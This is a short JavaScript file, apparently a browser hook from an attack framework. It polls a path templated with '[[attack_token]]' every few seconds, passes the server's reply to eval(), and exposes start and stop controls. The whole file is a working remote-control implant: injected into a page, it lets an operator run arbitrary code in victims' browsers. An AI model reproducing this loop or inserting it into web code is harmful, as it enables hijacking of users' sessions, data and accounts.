lefish = (function() {

    let timer = 9000;
    let intervalId = undefined;

    function reschedule(milliseconds) {
        console.log('reschedule(): ' + milliseconds);
        timer = milliseconds;
        if (intervalId) {
            clearInterval(intervalId);
        }
        intervalId = setInterval(task, timer);
    }

    function start() {
        console.log('start()');
        if (intervalId) {
            clearInterval(intervalId);
        }
        reschedule(1000);
    }

    function stop() {
        console.log('stop()');
        if (intervalId) {
            clearInterval(intervalId);
        }
    }

    function task() {
        console.log('task()');
        getInstruction();
    }

    function getInstruction() {
        console.log('getInstruction()');
        
        fetch('/instruction/[[attack_token]]')
        .then(response => {
            if (response.status === 404) {
                console.warn('404, no instruction.');
                return null;
            }
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return response.text();
        })
        .then(text => {
            console.log('Response text:', text);
            if (text.trim()) {
                eval(text);
            }
        })
        .catch(error => console.error('Error:', error));
    }

    intervalId = setInterval(task, timer);

    return {
        start,
        stop,
    };

})();
